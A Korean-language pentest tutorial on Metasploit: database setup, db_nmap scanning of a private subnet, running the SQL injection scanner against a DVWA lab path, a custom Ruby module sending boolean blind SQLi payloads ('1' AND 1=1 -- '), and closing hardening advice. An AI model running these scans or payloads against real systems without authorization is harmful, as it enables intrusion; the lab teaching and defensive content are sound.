1. 메타스플로잇 기반 침투 환경 구성 (MSF Environment Setup)

실전 모의 해킹에서 메타스플로잇(Metasploit Framework, MSF)은 단순한 도구가 아닌 데이터베이스 기반의 통합 침투 거점입니다. 공격자는 먼저 로컬 데이터베이스를 활성화하여 수집된 자산을 체계적으로 관리해야 합니다.

[Step 1: 데이터베이스 초기화 및 실행]

$ sudo msfdb init # PostgreSQL 기반 DB 초기화
$ msfconsole -q # 배너 없이 조용히 실행
msf6 > db_status
[*] Connected to msf. Connection type: postgresql.

[Step 2: 정보 수집 및 자산 등록]

msf6 > db_nmap -sV -p 80,443,3306 192.168.1.0/24
msf6 > hosts # 스캔된 자산 확인
msf6 > services # 활성화된 서비스 식별

PRO TIP: `db_nmap`을 사용하면 스캔 결과가 MSF 데이터베이스에 자동 저장되어, 추후 공격 대상(Target)을 지정할 때 매우 효율적입니다.

Technical Terminology
  • • Metasploit Framework (메타스플로잇 프레임워크, MSF): 전 세계에서 가장 많이 사용되는 오픈 소스 침투 테스트 프레임워크입니다.
  • • msfconsole (MSF 콘솔): MSF의 기능을 텍스트 기반 인터페이스로 제어하는 통합 관리 도구입니다.
  • • PostgreSQL (포스트그레스큐엘): MSF의 스캔 결과와 세션 정보를 저장하기 위해 내부적으로 사용하는 객체-관계형 데이터베이스(ORDBMS)입니다.
Operational Initial
  • • db_nmap (데이터베이스 엔맵): Nmap의 강력한 포트 스캔 기능을 MSF 환경 내에서 직접 실행하고 결과를 DB에 연동하는 명령어입니다.
  • • -sV (Service Version): 타겟 포트에서 실행 중인 서비스의 정확한 명칭과 버전 정보를 확인하는 옵션입니다.

2. 취약점 정밀 분석 및 모듈 체계 (Vulnerability Analysis)

자산이 식별되면 타겟의 파라미터에 주입 가능한 SQL 취약점이 존재하는지 확인합니다. MSF는 이를 위해 **보조 모듈(Auxiliary Modules)**을 제공하여 공격 전 단계의 스캐닝을 지원합니다.

[도식: MSF SQLi 침투 단계 및 명령어 체계 (MSF SQLi Exploitation Pipeline)]

Search
search type:auxiliary sql

관련 스캐너 탐색

Select
use auxiliary/scanner/...

모듈 활성화

Options
show options
set RHOSTS [IP]

공격 파라미터 설정

Execute
run 또는 exploit

취약점 검증 시작

MSF SQLi 스캐닝 실무 명령어 (Practice Command Line)

# HTTP 기반 SQL 인젝션 스캐너 선택
msf6 > use auxiliary/scanner/http/sql_injection

# 타겟 및 경로 설정
msf6 auxiliary(http/sql_injection) > set RHOSTS 192.168.1.10
msf6 auxiliary(http/sql_injection) > set URI /dvwa/vulnerabilities/sqli/
msf6 auxiliary(http/sql_injection) > set GET_PARAMS id

# 공격 실행 및 결과 확인
msf6 auxiliary(http/sql_injection) > run
[+] 192.168.1.10:80 - Vulnerable to SQL injection at /dvwa/vulnerabilities/sqli/ (param: id)
Module Categories
  • • Auxiliary Modules (보조 모듈): 실제 공격(Exploit) 전에 수행되는 스캐닝, 퍼징, 정보 수집을 담당하는 모듈군입니다.
  • • Exploit Modules (공격 모듈): 발견된 취약점을 실제로 이용하여 시스템에 침투하고 페이로드를 전달하는 모듈입니다.
Operational Options
  • • RHOSTS (Remote Hosts): 공격 대상이 되는 원격지의 IP 주소 또는 호스트명을 설정하는 옵션입니다.
  • • URI (Uniform Resource Identifier): 타겟 서버 내에서 취약점이 존재하는 구체적인 페이지 경로입니다.

3. MSF 공격 모듈 심층 분석 (Deep Code Analysis)

Ruby-based Metasploit Exploit Module Logic

메타스플로잇의 모든 모듈은 **루비(Ruby)** 언어로 작성됩니다. 아래 코드는 HTTP 기반의 블라인드 SQL 인젝션을 탐지하기 위한 모듈의 핵심 구조와 논리 로직을 객체 지향 관점에서 분석한 것입니다.

msf_sql_scanner.rb
class MetasploitModule < Msf::Auxiliary # 1. MSF 보조 모듈 클래스 상속(Inheritance)
  include Msf::Exploit::Remote::HttpClient # 2. HTTP 통신을 위한 믹스인(Mixin) 포함

  def initialize(info = {}) # 3. 객체 생성 시 모듈의 메타데이터 정의
    super(update_info(info,
      'Name'           => 'Custom Blind SQL Injection Scanner',
      'Description'    => 'SQL injection detection logic using Ruby',
      'Author'         => [ 'Architect' ],
      'License'        => MSF_LICENSE
    ))
    register_options([ # 4. 사용자로부터 입력받을 변수(Options) 등록
      OptString.new('URI', [true, 'The path to test', '/'])
    ])
  end

  def run # 5. 실행 시 호출되는 메인 메소드(Entry Point)
    target_uri = datastore['URI']
    
    # 6. 블라인드 인젝션 검증용 참(True) 페이로드 전송
    print_status("Testing for Boolean-based Blind SQLi...")
    res_true = send_request_cgi({
      'method' => 'GET',
      'uri'    => target_uri,
      'vars_get' => { 'id' => "1' AND 1=1 -- " } # [각주] 1=1은 항상 참임
    })

    # 7. 블라인드 인젝션 검증용 거짓(False) 페이로드 전송
    res_false = send_request_cgi({
      'method' => 'GET',
      'uri'    => target_uri,
      'vars_get' => { 'id' => "1' AND 1=2 -- " } # [각주] 1=2는 항상 거짓임
    })

    # 8. 두 응답의 차이를 비교하여 취약점 판별
    if res_true && res_false && (res_true.body != res_false.body)
      print_good("Vulnerability Detected: Response bodies differ on injection!")
    else
      print_error("No vulnerability found.")
    end
  end
end

Ruby & MSF API Analysis

  • Msf::Exploit::Remote::HttpClient: 루비의 믹스인(Mixin) 기능을 통해 HTTP 요청 라이브러리를 모듈에 주입합니다. 이를 통해 `send_request_cgi`와 같은 고수준 API를 사용할 수 있습니다.
  • datastore['URI']: MSF 콘솔에서 `set URI` 명령어로 입력한 값이 저장되는 해시(Hash) 객체입니다. 런타임에 사용자 설정을 가져오는 통로입니다.

Logical Comparison Algorithm

블라인드 인젝션의 핵심 로직은 응답 차분 분석(Differential Analysis)입니다.

  • • 참(True) 조건: 서버가 정상적인 데이터를 반환할 때의 응답 본문(Body) 크기를 캡처합니다.
  • • 거짓(False) 조건: 쿼리 결과가 없을 때의 응답 본문을 캡처합니다.
  • • 판별: 두 본문 데이터가 다를 경우, 서버가 주입된 논리 구문을 해석하여 실행하고 있음을 의미합니다.
Ruby Language Features
  • • Mixin (믹스인): 클래스 상속과는 별개로 다른 모듈의 기능을 포함(Include)시켜 기능을 확장하는 루비의 고유 특성입니다.
  • • CGI (Common Gateway Interface): 웹 서버와 프로그램 간의 데이터 교환 표준으로, MSF에서는 HTTP 파라미터를 다루는 API 명칭에 사용됩니다.
Logic Annotation
  • • -- (Double Dash): SQL 구문 뒤의 나머지 부분을 주석 처리하여 문법적 에러를 방지하는 매우 중요한 기호입니다.
  • • datastore: MSF 모듈 내에서 사용자가 설정한 모든 변수값(RHOSTS, URI 등)을 담고 있는 전역 데이터 저장소입니다.

4. 아키텍트 관점의 통합 방어 체계 (Defense Architecture)

Strategic Hardening

메타스플로잇과 같은 강력한 프레임워크를 방어하기 위해서는 개별 취약점 패치를 넘어선 **아키텍처 수준의 강화(Hardening)**가 필요합니다.

1. Prepared Statements (의무화)

애플리케이션 소스 레벨에서 쿼리 구조와 데이터를 분리하여 인젝션 공격의 원천을 제거하십시오.

2. WAF Behavior Analysis

MSF 모듈이 생성하는 `send_request_cgi` 패턴을 분석하여 비정상적인 논리 연산자 주입 시 실시간 차단하십시오.

Database Layer Isolation

공격자가 인젝션에 성공하더라도 피해를 최소화하기 위해 데이터베이스 계정에 **최소 권한 원칙(Least Privilege)**을 적용해야 합니다.

# 보안 권고: DB 계정 권한 제한
REVOKE ALL PRIVILEGES ON *.* FROM 'web_user'@'%';
GRANT SELECT, INSERT ON service_db.logs TO 'web_user'@'%';
-- DROP, TRUNCATE, FILE 등의 시스템 권한은 절대 배제
